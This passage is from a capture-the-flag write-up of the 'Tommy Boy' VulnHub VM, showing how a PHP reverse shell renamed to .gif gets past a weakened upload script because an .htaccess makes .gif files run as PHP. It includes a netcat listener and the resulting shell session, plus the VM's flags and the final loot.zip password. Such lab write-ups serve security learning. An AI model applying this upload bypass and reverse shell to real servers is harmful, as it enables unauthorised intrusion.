The file php-reverse-shell.php.jpg has been uploaded to /uploads.
{% endhighlight %}

Unfortunately it fails to work, complaining about the image not being an image.  Damn, ok well I have shell access lets to find that code.

{% highlight bash %}
bigtommysenior@CallahanAutoSrv01:~$ locate Nick
/var/thatsg0nnaleaveamark/NickIzL33t
/var/thatsg0nnaleaveamark/NickIzL33t/.htaccess
/var/thatsg0nnaleaveamark/NickIzL33t/flagtres.txt
/var/thatsg0nnaleaveamark/NickIzL33t/hint.txt
/var/thatsg0nnaleaveamark/NickIzL33t/index.html
/var/thatsg0nnaleaveamark/NickIzL33t/jfallon.html
/var/thatsg0nnaleaveamark/NickIzL33t/onemorethingyourewelcome
/var/thatsg0nnaleaveamark/NickIzL33t/t0msp4ssw0rdz.zip
bigtommysenior@CallahanAutoSrv01:~$ cd /var/thatsg0nnaleaveamark/NickIzL33t/
bigtommysenior@CallahanAutoSrv01:/var/thatsg0nnaleaveamark/NickIzL33t$ ls -al
total 36
drwxr-xr-x 3 www-data www-data 4096 Jul 17 08:19 .
drwxr-xr-x 3 www-data www-data 4096 Jul 14 21:40 ..
-rw-r--r-- 1 www-data www-data  459 Jul 15 12:44 fallon1.html
-rw-rw-r-- 1 www-data www-data   62 Jul  7 15:23 flagtres.txt
-rw-r--r-- 1 www-data www-data  653 Jul  8 18:05 hint.txt
-rw-r--r-- 1 www-data www-data  207 Jul 14 14:35 .htaccess
-rw-r--r-- 1 www-data www-data  270 Jul 14 21:11 index.html
drwxr-xr-x 3 www-data www-data 4096 Jul 15 12:47 P4TCH_4D4MS
-rw-rw-r-- 1 www-data www-data  524 Jul  8 19:22 t0msp4ssw0rdz.zip
bigtommysenior@CallahanAutoSrv01:/var/thatsg0nnaleaveamark/NickIzL33t$ cd P4TCH_4D4MS$
bigtommysenior@CallahanAutoSrv01:/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS$ ls
backupload.php  index.html  upload.php  uploads
bigtommysenior@CallahanAutoSrv01:/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS$ cat upload.php

<?php
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
$imageFileType = pathinfo($target_file,PATHINFO_EXTENSION);
// Check if image file is a actual image or fake image
//if(isset($_POST["submit"])) {
//    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
//    if($check !== false) {
//        echo "File is an image - " . $check["mime"] . ".";
//        $uploadOk = 1;
//    } else {
//        echo "File is not an image.";
//        $uploadOk = 0;
//    }
//}
// Check if file already exists
if (file_exists($target_file)) {
    echo "Sorry genius, that file already exists. ";
    $uploadOk = 0;
}
// Check file size
if ($_FILES["fileToUpload"]["size"] > 500000) {
    echo "Sorry, your file is too large - what a moron! .";
    $uploadOk = 0;
}
// Allow certain file formats
if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg"
&& $imageFileType != "gif" ) {
    echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed, douchenozzle! ";
    $uploadOk = 0;
}
// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
    echo "Sorry, your file was not uploaded.  Want me to save your game of Minesweeper though? ";
// if everything is ok, try to upload file
} else {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded to /uploads.";
    } else {
        echo "Sorry, there was an error uploading your file.  Have you tried rebooting or single-clicking on it? ";
    }
}
?>

bigtommysenior@CallahanAutoSrv01:/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS$ cat uploads/.htaccess
BrowserMatchNoCase "iPhone" allowed
AddType application/x-httpd-php .gif
Order Deny,Allow
Deny from ALL
Allow from env=allowed
ErrorDocument 403 "<H1>Nick's sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content</H1><H2>Lol</H2>"
bigtommysenior@CallahanAutoSrv01:/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS$ -
{% endhighlight %}

So in searching the file system I thought I found various interesting files in the Dropbox.  I guess its Nick's old stuff and it was gone (aka updatedb was not run). Anyway I jumped into the P4TCH_4D4MS folder and looked at the upload.php and .htaccess.  Sure enough content checking is disabled on the upload script.  OH but GIF is allowed to execute php code.   A quick rename of my script to .gif and an upload.

{% highlight bash %}
root@kali:~/evidence/tommyboy1.0# nc -lvp 2222
listening on [any] 2222 ...
192.168.244.160: inverse host lookup failed: Unknown host
connect to [192.168.244.155] from (UNKNOWN) [192.168.244.160] 45630
Linux CallahanAutoSrv01 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 18:34:07 up  2:46,  1 user,  load average: 0.00, 0.00, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
bigtommy pts/0    192.168.244.155  17:47    1:19   0.13s  0.13s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cd /
$ ls -al
total 105
drwxr-xr-x  25 root     root      4096 Jul 15 12:35 .
drwxr-xr-x  25 root     root      4096 Jul 15 12:35 ..
-rwxr-x---   1 www-data www-data   520 Jul  7 15:36 .5.txt

$ cat /.5.txt
FIFTH FLAG!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
YOU DID IT!!!!!!!!!!!!!!!!!!!!!!!!!!!!
OH RICHARD DON'T RUN AWAY FROM YOUR FEELINGS!!!!!!!!

Flag data: Buttcrack

Ok, so NOW what you do is take the flag data from each flag and blob it into one big chunk.
So for example, if flag 1 data was "hi" and flag 2 data was "there" and flag 3 data was "you"
you would create this blob:

hithereyou

Do this for ALL the flags sequentially, and this password will open the loot.zip in Big Tom's
folder and you can call the box PWNED.
$ -
{% endhighlight %}

Now to complete and get the LOOT.ZIP opened up.  So we unlock with the following password `B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack`.

{% highlight bash %}
bigtommysenior@CallahanAutoSrv01:~$ unzip LOOT.ZIP
Archive:  LOOT.ZIP
[LOOT.ZIP] THE-END.txt password: B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
  inflating: THE-END.txt             
bigtommysenior@CallahanAutoSrv01:~$ cat THE-END.txt
YOU CAME.
YOU SAW.
YOU PWNED.

Thanks to you, Tommy and the crew at Callahan Auto will make 5.3 cajillion dollars this year.

GREAT WORK!

I'd love to know that you finished this VM, and/or get your suggestions on how to make the next
one better.

Please shoot me a note at 7ms @ 7ms.us with subject line "Here comes the meat wagon!"

Or, get in touch with me other ways:

* Twitter: @7MinSec
* IRC (Freenode): #vulnhub (username is braimee)

Lastly, please don't forget to check out www.7ms.us and subscribe to the podcast at
bit.ly/7minsec

</shamelessplugs>

Thanks and have a blessed week!

-Brian Johnson
7 Minute Security
bigtommysenior@CallahanAutoSrv01:~$
{% endhighlight %}

## Final Thoughts
Loved this VM, very well done some fun quality hacks and very well themed.  I'll play more of these for sure.  The only gotcha I'd have is not having taken into account the year the movie came out for the WordPress dates, but that is so minor and insignificant.
